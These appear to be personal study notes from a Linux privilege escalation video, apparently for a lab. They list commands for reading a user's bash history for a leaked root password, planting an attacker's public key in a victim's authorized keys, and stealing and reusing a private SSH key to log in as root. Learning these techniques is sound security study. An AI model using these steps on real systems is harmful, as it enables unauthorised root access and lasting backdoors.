# SSH Keys, History Files & Config Files || LPE

```bash
ls -la
cat .bash-history
su root
password123
```

![2026-08-26 23_47_33-SSH Keys, History Files and Config Files __ Linux Privilege Escalation - YouTube.png](SSH%20Keys,%20History%20Files%20&%20Config%20Files%20LPE/2026-08-26_23_47_33-SSH_Keys_History_Files_and_Config_Files____Linux_Privilege_Escalation_-_YouTube.png)

**Read config file**

# Tricks 1

- **own public key to the victim**

```bash
ssh-keygen -t rsa
```

**my own system/ attacking machine**

```bash
ssh-keygen -t rsa 
```

**copy my .pub keys**

**on victim** 

```bash
~/.ssh$ vim authorized-keys
```

```bash
ssh user@10.10.29.167 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa

```

# Tricks 2

**If we read any user's private key** 

```bash
cd .ssh
cat id_rsa/ root_key
```

**Attacking Machine**

```bash
vim id_rsa
chmod 600 id_rsa

```

**if encrypted, use ssh-john tool**

```bash
ssh root@10.10.29.167 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -i id_rsa
```